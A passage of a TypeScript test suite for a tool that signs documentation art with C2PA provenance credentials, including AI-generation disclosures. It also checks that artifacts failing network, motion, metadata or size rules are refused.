    ['svg', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><metadata><x/></metadata><rect/></svg>'],
    [C2PA_FRAGMENT_PROFILE.format, fixture('ok', 'masthead', 'test-fragment.html')],
  ];
  for (const [format, source] of cases) {
    const signed = await embedC2pa(enc.encode(source), format, { title: 't' });
    assert.equal(stripArtManifest(dec.decode(signed), format), source, `strip(sign(x)) !== x for ${format}`);
  }
});

test('strip: the bank strip and the presentation strip are the SAME rule', async () => {
  // Three hand-written copies of "remove the armour line" existed — this script's,
  // docs/docs-art.ts's, and the placer's own — and two of them were looser than the
  // placer, so each cut host content the placer never added. The engine's
  // stripPlacedArmorLine is the one owner now (it is the placer's inverse); this
  // pins the two consumers to it, which is the house drift-guard pattern.
  const src = fixture('ok', 'masthead', 'test-fragment.html');
  const signed = dec.decode(await embedC2pa(enc.encode(src), C2PA_FRAGMENT_PROFILE.format, { title: 't' }));
  assert.equal(stripArtManifest(signed, C2PA_FRAGMENT_PROFILE.format), src, 'the bank strip restores the source');
  const inlined = stripArtForInline(signed, 'fig-x-');
  assert.doesNotMatch(inlined, /-----(?:BEGIN|END) C2PA MANIFEST-----/, 'the presentation copy carries no credential');
  assert.equal(stripPlacedArmorLine(signed).trim(), src.trim(), 'and both are the engine function');
  // Prose that merely QUOTES the delimiters is content in both directions: the bank
  // strip leaves it (the lint then refuses the artifact) and the presentation strip
  // refuses to ship a copy it cannot account for, rather than deleting a paragraph.
  const doc = '<p>x</p>\n<pre>-----BEGIN C2PA MANIFEST----- data:application/c2pa;base64,AA -----END C2PA MANIFEST-----</pre>\n<p>y</p>\n';
  assert.equal(stripArtManifest(doc, C2PA_FRAGMENT_PROFILE.format), doc);
  assert.throws(() => stripArtForInline(doc, 'p-'), /carrier survived/);
  // An artifact's OWN <metadata> is not a carrier and survives the inline strip.
  const withMeta = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><metadata><x/></metadata><rect/></svg>';
  const signedSvg = dec.decode(await embedC2pa(enc.encode(withMeta), 'svg', { title: 't' }));
  assert.match(stripArtForInline(signedSvg, 'fig-y-'), /<metadata><x\/><\/metadata>/);
});

test('artDims reads the viewBox and refuses to guess', () => {
  assert.deepEqual(artDims('<svg viewBox="0 0 640 200"/>'), { width: 640, height: 200 });
  assert.equal(artDims('<svg width="100" height="50"/>'), undefined);
  assert.equal(artDims('<svg viewBox="0 0 0 0"/>'), undefined);
});

// ── the claim ─────────────────────────────────────────────────────────────────

test('claim: the options carry the source type, the disclosure and the spec version', () => {
  const meta: ArtMeta = {
    generator: { name: 'Claude Code', version: 'opus-5' },
    model: {
      name: 'Claude Opus 5', identifier: 'claude-opus-5',
      vendor: 'Anthropic', region: { city: 'London', country: 'United Kingdom' },
    },
    oversight: 'prompt_guided', source: 'trainedAlgorithmicMedia',
    author: { name: 'Andy Fitzsimon' },
  };
  const opts = artC2paOpts(meta, { id: 'x', kind: 'masthead', format: 'svg' });
  assert.equal(opts.actions?.[0]?.action, 'c2pa.created');
  assert.equal(opts.actions?.[0]?.digitalSourceType, ART_SOURCE_TYPES.trainedAlgorithmicMedia);
  // The authoring tool rides in the action's description: §10.2.3.2 reserves
  // claim_generator_info for the actor that generated the CLAIM, which is Lolly.
  assert.match(String(opts.actions?.[0]?.description), /Claude Code opus-5/);
  assert.equal((opts.generatorInfo as { name: string }).name, 'Lolly');
  assert.equal(opts.specVersion, '2.4.0');
  // The §18.28 disclosure stays spec-clean — vendor/region are NOT grafted onto it.
  assert.deepEqual(opts.aiDisclosure, { modelName: 'Claude Opus 5', modelIdentifier: 'claude-opus-5', oversight: 'prompt_guided' });
  // The director is the C2PA human author; vendor + serving region are Lolly-namespaced
  // environment facts beside `generator`.
  assert.deepEqual(opts.author, { name: 'Andy Fitzsimon' });
  const env = opts.environment as Record<string, unknown>;
  assert.equal(env.surface, 'docs');
  assert.equal(env.artifact, 'masthead');
  assert.equal(env.generator, 'Claude Code opus-5');
  assert.equal(env.modelVendor, 'Anthropic');
  assert.equal(env.modelRegion, 'London, United Kingdom');
  // The credential window outlives the artifact's usefulness on purpose (see the
  // script): a file that never changed must never read "expired" to a reader.
  assert.ok(ART_CREDENTIAL_DAYS >= 365 * 5);
});

test('claim: digitalCreation attaches NO disclosure — §18.28.3', () => {
  const opts = artC2paOpts({ generator: { name: 'A human, in a text editor' }, source: 'digitalCreation' },
    { id: 'x', kind: 'figure', format: 'svg' });
  assert.equal(opts.aiDisclosure, undefined);
  assert.equal(opts.actions?.[0]?.digitalSourceType, ART_SOURCE_TYPES.digitalCreation);
});

test('claim: the fragment names its own profile in the environment', () => {
  // The v2 claim carries no dc:format, so `report.environment.format` is the ONLY
  // place a reader can learn that these bytes were bound under Lolly's fragment
  // profile rather than §A.7 (A1's finding 5.2). /verify keys its label off it.
  const opts = artC2paOpts({ generator: { name: 'x' }, source: 'digitalCreation' },
    { id: 'x', kind: 'masthead', format: C2PA_FRAGMENT_PROFILE.format });
  assert.equal((opts.environment as Record<string, unknown>).format, 'html-fragment');
  assert.equal(ART_FORMATS['.html'], C2PA_FRAGMENT_PROFILE.format);
});

// ── the pipeline, end to end ──────────────────────────────────────────────────

test('sign: a clean bank is signed, verifies, and discloses its model', async (t) => {
  const dir = stage(CLEAN);
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const run = await signDocsArt({ docsDir: dir, ...silent });
  assert.deepEqual(run.violations, []);
  assert.deepEqual(run.signed.sort(), ['test-band', 'test-fragment', 'test-page-chart']);

  for (const rel of ['mastheads/test-band.svg', 'mastheads/test-fragment.html', 'figures/test-page-chart.svg']) {
    const bytes = read(dir, rel);
    const report = await verifyC2pa(bytes);
    // 'valid' with an untrusted signer is the designed posture for an on-device key.
    assert.equal(report.state, 'valid', `${rel} did not verify`);
    assert.equal(report.trusted, false);
    assert.equal(report.specVersion, '2.4.0');
    assert.equal(report.aiDisclosure?.modelName, 'Claude Opus 5');
    assert.equal(report.aiGenerated?.kind, 'generated');
    const { created, labels } = claimFacts(bytes);
    assert.equal(created?.get('digitalSourceType'), ART_SOURCE_TYPES.trainedAlgorithmicMedia);
    assert.ok(labels.some((l) => l.startsWith('c2pa.ai-disclosure')));
  }
  const fragment = await verifyC2pa(read(dir, 'mastheads/test-fragment.html'));
  // The v2 claim carries no dc:format, so the reader sniffs the CARRIER ('code' —
  // §A.9 armour) and the profile is recoverable only from our own environment
  // assertion. Both halves are asserted so /verify can key its "Lolly fragment
  // profile" label off the pair without either side drifting silently.
  assert.equal(fragment.format, 'code');
  assert.equal(fragment.environment?.format, 'html-fragment');
  assert.equal((await verifyC2pa(read(dir, 'mastheads/test-band.svg'))).format, 'svg');
  assert.equal((await verifyC2pa(read(dir, 'figures/test-page-chart.svg'))).environment?.artifact, 'figure');
});

test('sign: the docs build can read the model and oversight back off the file', async (t) => {
  // The B1 → B2 contract: the credential line's model pill comes from the artifact's
  // OWN store via readShotProvenance, not from the page's manifest.
  const dir = stage([CLEAN[0]!]);
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  await signDocsArt({ docsDir: dir, ...silent });
  const prov = readShotProvenance(join(dir, 'mastheads/test-band.svg'));
  assert.equal(prov?.model, 'Claude Opus 5');
  assert.equal(prov?.oversight, 'prompt_guided');
  assert.equal(prov?.surface, 'docs');
  assert.equal(prov?.ai, 'generated');
  assert.match(String(prov?.generator), /^Lolly /);
});

test('sign: an unchanged bank is a no-op, byte for byte', async (t) => {
  // Every run mints a fresh key and timestamp, so "sign everything" would rewrite the
  // committed bank on every build. The skip is decided by the hard binding, which is
  // the only fact that answers "are these the bytes that were signed".
  const dir = stage(CLEAN);
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  await signDocsArt({ docsDir: dir, ...silent });
  const paths = ['mastheads/test-band.svg', 'mastheads/test-fragment.html', 'figures/test-page-chart.svg'];
  const before = paths.map((r) => read(dir, r));
  const second = await signDocsArt({ docsDir: dir, ...silent });
  assert.deepEqual(second.signed, []);
  assert.deepEqual(second.skipped.sort(), ['test-band', 'test-fragment', 'test-page-chart']);
  for (const [i, rel] of paths.entries()) assert.deepEqual(read(dir, rel), before[i]);
});

test('sign: edited art is re-signed; --force re-signs regardless', async (t) => {
  const dir = stage([CLEAN[0]!]);
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  await signDocsArt({ docsDir: dir, ...silent });
  const path = join(dir, 'mastheads/test-band.svg');

  const edited = readFileSync(path, 'utf-8').replace('cx="120"', 'cx="128"');
  writeFileSync(path, edited);
  assert.equal((await artBindingState(new Uint8Array(readFileSync(path)))).bound, false, 'the binding must break on an edit');
  const rerun = await signDocsArt({ docsDir: dir, ...silent });
  assert.deepEqual(rerun.signed, ['test-band']);
  assert.equal((await verifyC2pa(new Uint8Array(readFileSync(path)))).state, 'valid');
  // The re-signed file carries ONE manifest, not a nest of them.
  assert.equal(readFileSync(path, 'utf-8').match(/<c2pa:manifest\b/g)?.length, 1);
  assert.ok(readFileSync(path, 'utf-8').includes('cx="128"'), 'the edit survived signing');

  const forced = await signDocsArt({ docsDir: dir, force: true, ...silent });
  assert.deepEqual(forced.signed, ['test-band']);
});

test('sign: --check writes nothing and says what would be signed', async (t) => {
  const dir = stage([CLEAN[0]!]);
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const path = join(dir, 'mastheads/test-band.svg');
  const before = readFileSync(path);
  const run = await signDocsArt({ docsDir: dir, check: true, ...silent });
  assert.deepEqual(run.signed, []);
  assert.deepEqual(run.wouldSign, ['test-band']);
  assert.deepEqual(readFileSync(path), before);
});

// ── refusals, through the whole pipeline ──────────────────────────────────────

test('refuse: no meta.json — provenance is not optional', async (t) => {
  const dir = stage([{ from: 'refuse', kind: 'masthead', name: 'no-meta.svg' }]);
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const run = await signDocsArt({ docsDir: dir, ...silent });
  assert.ok(run.violations.some((v) => v.rule === 'meta' && v.message.includes('no-meta.meta.json')));
  assert.deepEqual(run.signed, []);
  assert.equal(extractC2paStore(read(dir, 'mastheads/no-meta.svg')), null);
});

test('refuse: one bad artifact stops the whole run — nothing is signed', async (t) => {
  // A bank with one refused entry is a bank under review. Signing the rest would
  // publish a page whose credential line is complete and whose bank is not.
  const dir = stage([...CLEAN, { from: 'refuse', kind: 'masthead', name: 'exfil-plain.svg' }]);
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const run = await signDocsArt({ docsDir: dir, ...silent });
  assert.ok(run.violations.length >= 1);
  assert.deepEqual(run.signed, []);
  for (const rel of ['mastheads/test-band.svg', 'mastheads/test-fragment.html', 'figures/test-page-chart.svg']) {
    assert.equal(extractC2paStore(read(dir, rel)), null, `${rel} must not have been signed`);
  }
  // …and every problem is listed, not just the first, so curation is one pass.
  const files = new Set(run.violations.map((v) => v.file));
  assert.ok(files.has('mastheads/exfil-plain.svg'));
});

test('refuse: every refusal fixture is refused, and each names its rule', async (t) => {
  for (const [name, rule] of [['exfil-plain.svg', 'network'], ['exfil-hidden.html', 'network'],
    ['unguarded-motion.html', 'motion'], ['contradictory-meta.svg', 'meta'], ['no-meta.svg', 'meta']] as const) {
    const dir = stage([{ from: 'refuse', kind: 'masthead', name }]);
    t.after(() => rmSync(dir, { recursive: true, force: true }));
    const run = await signDocsArt({ docsDir: dir, ...silent });
    assert.ok(run.violations.length, `${name} was NOT refused`);
    assert.ok(rules(run.violations).includes(rule), `${name} → expected ${rule}, got ${rules(run.violations).join(',')}`);
    assert.deepEqual(run.signed, []);
  }
});

test('refuse: an over-budget artifact, through the real pipeline', async (t) => {
  const dir = stage([]);
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const filler = '  <rect x="0" y="0" width="1" height="1" fill="currentColor" opacity=".01" />\n';
  writeFileSync(join(dir, 'mastheads/too-big.svg'),
    `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">\n${filler.repeat(900)}</svg>`);
  writeFileSync(join(dir, 'mastheads/too-big.meta.json'), JSON.stringify({
    generator: { name: 'Claude Code' }, model: { name: 'Claude Opus 5' },
    oversight: 'prompt_guided', source: 'trainedAlgorithmicMedia',
  }));
  const run = await signDocsArt({ docsDir: dir, ...silent });
  assert.ok(run.violations.some((v) => v.rule === 'budget' && v.message.includes('48 KB')));
  assert.deepEqual(run.signed, []);
});

test('sign: a hand-authored artifact gets a source type and no disclosure at all', async (t) => {
  // The digitalCreation half of §18.28.3, exercised on an artifact written here at
  // run time: no committed fixture may claim "no trained model invoked" about bytes
  // a model emitted (see the fixtures README).
  const dir = stage([]);
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  writeFileSync(join(dir, 'figures/hand-typed.svg'),
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect width="10" height="10" fill="currentColor"/></svg>\n');
  writeFileSync(join(dir, 'figures/hand-typed.meta.json'),
    JSON.stringify({ generator: { name: 'A text editor' }, source: 'digitalCreation' }));
  const run = await signDocsArt({ docsDir: dir, ...silent });
  assert.deepEqual(run.signed, ['hand-typed']);
  const bytes = read(dir, 'figures/hand-typed.svg');
  const { labels, created } = claimFacts(bytes);
  assert.equal(labels.filter((l) => l.startsWith('c2pa.ai-disclosure')).length, 0, 'no disclosure may be attached');
  assert.equal(created?.get('digitalSourceType'), ART_SOURCE_TYPES.digitalCreation);
  const report = await verifyC2pa(bytes);
  assert.equal(report.aiDisclosure, undefined);
  assert.equal(report.aiGenerated, undefined);
  assert.equal(readShotProvenance(join(dir, 'figures/hand-typed.svg'))?.model, null);
});

test('sign: a signed artifact still lints and still fits its budget', async (t) => {
  // The regression this guards: measuring a signed file instead of its source would
  // charge every artifact ~10 KB of its own credential, and would hand the denylist
  // 14 KB of base64 to scan for source tokens.
  const dir = stage([CLEAN[0]!]);
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  await signDocsArt({ docsDir: dir, ...silent });
  const path = join(dir, 'mastheads/test-band.svg');
  const signed = readFileSync(path, 'utf-8');
  assert.ok(statSync(path).size > Buffer.byteLength(fixture('ok', 'masthead', 'test-band.svg')));
  assert.deepEqual(lintArtSource(stripArtManifest(signed, 'svg'), ctx()), []);
  const rerun = await signDocsArt({ docsDir: dir, ...silent });
  assert.deepEqual(rerun.violations, []);
});

test('sign: an empty bank is a clean run, and a missing bank directory is not an error', async (t) => {
  const dir = stage([]);
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  rmSync(join(dir, 'figures'), { recursive: true, force: true });
  const run = await signDocsArt({ docsDir: dir, ...silent });
  assert.deepEqual(run, { violations: [], signed: [], skipped: [], wouldSign: [], warnings: [] });
});

// ── the shipped bank ──────────────────────────────────────────────────────────

test('the real docs/mastheads and docs/figures pass their own gate', async () => {
  // Andy banks the art; this is the guard that a committed artifact is signed, lints
  // clean, and has not drifted from its credential. It runs in --check mode so the
  // test never writes into the repo.
  const run = await signDocsArt({ docsDir: join(ROOT, 'docs'), check: true, ...silent });
  assert.deepEqual(run.violations, [], `the banked art does not pass the gate:\n${run.violations.map((v) => `${v.file}: ${v.message}`).join('\n')}`);
  assert.deepEqual(run.wouldSign, [], `banked art with no current credential: ${run.wouldSign.join(', ')} — run node scripts/sign-docs-art.ts`);
});
